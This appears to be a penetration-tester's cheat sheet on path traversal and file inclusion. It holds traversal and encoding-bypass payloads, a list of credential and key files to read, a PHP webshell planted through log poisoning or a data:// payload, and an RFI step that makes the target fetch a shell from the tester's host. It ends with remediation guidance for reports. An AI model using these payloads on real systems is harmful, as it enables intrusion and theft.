# Path Traversal / Local File Inclusion (LFI)

---

## Detection

Vulnerable parameter patterns:
```
http://target.com/page?file=about.php
http://target.com/page?path=docs/manual.pdf
http://target.com/include?page=contact
```

---

## Basic Traversal

```
# Unix
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd

# Windows
..\..\..\Windows\System32\drivers\etc\hosts
..%5C..%5C..%5CWindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
```

---

## URL Encoding Bypasses

```
# Single encoding
%2e%2e%2f = ../

# Double encoding
%252e%252e%252f = ../

# UTF-8 encoding
%c0%ae%c0%ae/ = ../
```

---

## Interesting Files (Linux)

```
/etc/passwd                     # Users
/etc/shadow                     # Password hashes (if root)
/etc/hosts                      # Network config
/etc/ssh/sshd_config            # SSH config
/home/user/.ssh/id_rsa          # SSH private key
/home/user/.bash_history        # Command history
/var/log/apache2/access.log     # Web logs (for log poisoning)
/var/log/nginx/access.log
/proc/self/environ              # Environment variables
/proc/self/cmdline              # Current process command
/var/www/html/config.php        # App config with DB creds
```

---

## Interesting Files (Windows)

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM  (locked, can't read directly)
C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml
```

---

## LFI → RCE via Log Poisoning

```sh
# 1. Inject PHP code into Apache access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com

# 2. Include the log via LFI
http://target.com/?file=../../../var/log/apache2/access.log&cmd=id
```

---

## LFI via PHP Wrappers

```
# Base64 encode file contents (bypasses output filters)
http://target.com/?file=php://filter/convert.base64-encode/resource=index.php

# Decode on Kali
echo "BASE64STRING" | base64 -d

# Execute PHP code (if file= accepts data://)
http://target.com/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

---

## Remote File Inclusion (RFI)

If the server fetches external URLs:
```
# Host malicious PHP on Kali
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
python3 -m http.server 8080

# Include it
http://target.com/?file=http://<KALI-IP>:8080/shell.php&cmd=id
```

---

## Wordlists for Fuzzing

```sh
# Fuzzing traversal with ffuf
ffuf -u "http://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

---

## Remediation

**Root cause:** The application uses user-supplied input to construct a file path and reads that file without validating that the resolved path is within an allowed directory. `../` sequences walk up the directory tree to reach files outside the intended scope.

| Finding | Remediation |
|---|---|
| Path traversal / LFI | **Canonicalize the path and validate it's within the allowed base directory.** In PHP: `realpath($base . $userInput)` then check it starts with `$base`. In Python: `os.path.realpath()` then check with `startswith(base_dir)`. |
| `../` accepted in input | Strip `../` sequences — but do this AFTER URL-decoding and canonicalization, not before (double encoding bypasses strip-then-check). |
| App loads arbitrary filenames from params | Switch to an **indirect reference** approach — instead of `?file=report.pdf`, use `?file=3` where 3 is a database ID. The server resolves the actual path internally; the user never controls the filename. |
| RFI (remote file inclusion) | Disable `allow_url_include` in `php.ini` (it defaults to Off in modern PHP). Audit PHP config on the server. |
| Log poisoning possible | Restrict web server read access to log files. Run the web server process as a non-root user so it can't access logs outside its own scope. |

**Key point for reports:** The correct fix is always a server-side path validation check after canonicalization, not a blocklist of `../`. Blocklists are bypassable via encoding. A check like `startswith(allowed_base)` after `realpath()` is structurally impossible to bypass.
